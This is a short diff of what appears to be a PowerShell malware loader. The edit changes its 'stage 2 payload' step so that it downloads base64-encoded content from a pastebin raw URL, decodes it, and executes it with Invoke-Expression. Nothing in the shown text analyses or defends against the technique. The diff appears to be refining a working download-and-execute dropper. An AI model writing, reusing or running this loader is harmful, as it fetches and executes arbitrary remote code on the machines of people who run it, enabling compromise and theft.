@@ -30,8 +30,9 @@ else  {
     # Download and execute stage 2 base64 encoded content payload
     try  {
       $stage2Url = "https://pastebin.com/raw/y9CNLxq6" 
-      $stage2 = Invoke-RestMethod -Uri $stage2Url
-      Invoke-Expression $stage2
+      $stage2base64 = Invoke-RestMethod -Uri $stage2Url
+      $stage2Decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($stage2base64))
+      Invoke-Expression $stage2Decoded
     }
     catch  {
         # Debug Code: Write-Error "An error occurred during download: $_"
